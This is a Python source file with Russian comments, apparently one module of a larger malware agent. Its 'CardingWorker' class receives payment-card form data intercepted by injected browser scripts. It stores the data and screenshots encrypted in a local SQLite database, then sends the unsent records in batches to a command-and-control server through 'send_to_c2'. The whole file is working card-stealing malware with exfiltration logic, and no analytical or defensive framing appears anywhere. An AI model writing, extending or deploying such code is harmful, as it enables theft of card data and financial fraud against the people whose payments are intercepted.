import os
import sqlite3
import time
import json # Для обработки данных из JS
from .utils import generate_key, encrypt_data, decrypt_data
import logging
# import threading # HTTP сервер будет в ядре агента
# from http.server import BaseHTTPRequestHandler, HTTPServer # Убираем
# import socket # Убираем

logger = logging.getLogger('CardingWorker')

# Убираем HTTP сервер и его обработчик
# class CardingHTTPRequestHandler(BaseHTTPRequestHandler): ...

class CardingWorker:
    def __init__(self, agent_interface=None, base_path: str = "."):
        self.agent_interface = agent_interface
        # Получаем базовый путь от агента
        self.base_path = os.path.join(base_path, 'src/modules/carding_worker')
        self.db_path = os.path.join(self.base_path, 'db/carding.db')
        self.key_path = os.path.join(self.base_path, 'db/fernet.key')
        self.inject_templates_path = os.path.join(self.base_path, 'inject_templates/')

        self.active = False
        # Добавляем try-except для загрузки ключа и инициализации БД
        try:
            self.key = self._load_or_create_key()
            self._init_db()
        except Exception as e:
             logger.error(f"Failed during CardingWorker init (key/db): {e}", exc_info=True)
             # Возможно, стоит поднять исключение выше или установить флаг ошибки?
             self.key = None # Индикатор проблемы

    # def _find_free_port(self): ... # Убираем
    # def _run_http_server(self): ... # Убираем

    def _load_or_create_key(self):
        key_dir = os.path.dirname(self.key_path)
        try:
             if not os.path.exists(key_dir):
                 os.makedirs(key_dir)
             if not os.path.exists(self.key_path):
                 key = generate_key()
                 with open(self.key_path, 'wb') as f:
                     f.write(key)
                 logger.info("Generated new Fernet key.")
                 return key
             with open(self.key_path, 'rb') as f:
                 return f.read()
        except OSError as e:
             logger.error(f"OS error accessing key file/directory {self.key_path}: {e}")
             raise # Поднимаем ошибку выше
        except Exception as e:
             logger.error(f"Unexpected error loading/creating key: {e}")
             raise

    def _init_db(self):
        db_dir = os.path.dirname(self.db_path)
        try:
            if not os.path.exists(db_dir):
                 os.makedirs(db_dir)
            conn = sqlite3.connect(self.db_path, timeout=10) # Добавляем таймаут
            c = conn.cursor()
            c.execute('''CREATE TABLE IF NOT EXISTS cards (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                domain TEXT,
                data BLOB,
                screenshot BLOB,
                timestamp INTEGER,
                sent INTEGER DEFAULT 0
            )''')
            # TODO: Добавить индексы?
            conn.commit()
            conn.close()
            logger.debug("Carding database initialized/checked.")
        except sqlite3.Error as e:
             logger.error(f"SQLite error initializing database {self.db_path}: {e}")
             raise
        except OSError as e:
             logger.error(f"OS error accessing DB directory {db_dir}: {e}")
             raise
        except Exception as e:
             logger.error(f"Unexpected error initializing database: {e}")
             raise

    def save_card_data(self, domain, data_dict, screenshot=None):
        if not self.key:
            logger.error("Cannot save card data: Fernet key is not loaded.")
            return
        try:
            enc_data = encrypt_data(self.key, json.dumps(data_dict).encode())
            enc_screenshot = encrypt_data(self.key, screenshot) if screenshot else None
            ts = int(time.time())
            conn = sqlite3.connect(self.db_path, timeout=10)
            c = conn.cursor()
            c.execute('''INSERT INTO cards (domain, data, screenshot, timestamp, sent) VALUES (?, ?, ?, ?, 0)''',
                      (domain, enc_data, enc_screenshot, ts))
            conn.commit()
            conn.close()
            logger.info(f"Saved data for {domain}")
        except sqlite3.Error as e:
             logger.error(f"SQLite error saving card data for {domain}: {e}")
        except Exception as e:
            logger.error(f"Error saving card data for {domain}: {e}", exc_info=True)

    def process_incoming_data(self, message_str: str):
        """Публичный метод для обработки данных, полученных агентом извне (e.g., HTTP)."""
        try:
            msg_data = json.loads(message_str)
            logger.debug(f"Processing browser message: {msg_data}")
            if msg_data.get('type') == 'carding_form' and self.agent_interface:
                domain = msg_data.get('domain', 'unknown')
                card_data = msg_data.get('data')
                if card_data:
                    self.agent_interface.on_form_intercepted(domain, card_data)
            else:
                 logger.warning(f"Received unknown message type or missing interface: {msg_data.get('type')}")
        except json.JSONDecodeError as e:
             logger.error(f"Failed to decode browser message JSON: {message_str[:200]}... Error: {e}")
        except Exception as e:
            logger.error(f"Error processing browser message: {e}", exc_info=True)

    def init(self):
        # Логика инициализации перенесена в __init__
        if self.key:
             logger.info("CardingWorker Initialized.")
        else:
             logger.error("CardingWorker initialization failed (key/db error).")

    def start(self):
        if self.active:
            return
        self.active = True
        logger.info("CardingWorker Started.")
        # HTTP сервер теперь запускается в ядре агента
        pass

    def stop(self):
        if not self.active:
            return
        self.active = False
        logger.info("CardingWorker Stopped.")
        # HTTP сервер останавливается ядром агента
        pass

    def update_templates(self):
        # TODO: Implement logic to fetch/update JS templates
        logger.info("update_templates called (not implemented).")
        pass

    def send_logs(self):
        if not self.key:
             logger.error("Cannot send logs: Fernet key not loaded.")
             return
        if not self.agent_interface:
            logger.warning("Agent interface not set, cannot send logs.")
            return

        logs_sent = 0
        rows = []
        conn = None
        try:
            conn = sqlite3.connect(self.db_path, timeout=10)
            conn.row_factory = sqlite3.Row
            c = conn.cursor()
            c.execute('SELECT * FROM cards WHERE sent = 0 LIMIT 100')
            rows = c.fetchall()
            # Не закрываем соединение здесь, будем обновлять статус
        except sqlite3.Error as e:
             logger.error(f"SQLite error reading logs: {e}")
             if conn: conn.close()
             return # Не можем продолжить без чтения логов
        except Exception as e:
             logger.error(f"Unexpected error reading logs: {e}")
             if conn: conn.close()
             return

        if not rows:
             logger.debug("No new carding logs to send.")
             if conn: conn.close()
             return

        # Используем то же соединение для обновления статуса
        try:
            c = conn.cursor() # Курсор уже есть из try блока выше
            for row in rows:
                log_id = row['id']
                try:
                    decrypted_data_str = decrypt_data(self.key, row['data']).decode()
                    log_entry = {
                        'id': log_id,
                        'domain': row['domain'],
                        'data': json.loads(decrypted_data_str),
                        'timestamp': row['timestamp']
                    }
                    logger.debug(f"Attempting to send log ID: {log_id}")
                    success = self.agent_interface.send_to_c2(log_entry)
                    if success:
                        c.execute('UPDATE cards SET sent = 1 WHERE id = ?', (log_id,))
                        conn.commit()
                        logs_sent += 1
                        logger.info(f"Successfully sent and marked log ID: {log_id}")
                    else:
                        logger.warning(f"Failed to send log ID: {log_id}. Will retry later.")
                        break
                except (json.JSONDecodeError, TypeError) as dec_err: # Добавил TypeError для decrypt
                     logger.error(f"Failed to decode/decrypt log data from DB for ID {log_id}. Marking as error. Error: {dec_err}")
                     c.execute('UPDATE cards SET sent = -1 WHERE id = ?', (log_id,))
                     conn.commit()
                except Exception as proc_err:
                    logger.error(f"Error processing/sending log ID {log_id}: {proc_err}", exc_info=True)
                    try:
                         c.execute('UPDATE cards SET sent = -1 WHERE id = ?', (log_id,))
                         conn.commit()
                    except Exception as mark_err:
                         logger.error(f"Failed to mark log ID {log_id} as error after processing error: {mark_err}")

            if logs_sent > 0:
                logger.info(f"Sent {logs_sent} logs to C2 this cycle.")

        except sqlite3.Error as e:
            logger.error(f"SQLite error updating log status: {e}")
        except Exception as e:
            logger.error(f"Unexpected error during log sending/updating: {e}", exc_info=True)
        finally:
             if conn: conn.close() # Всегда закрываем соединение 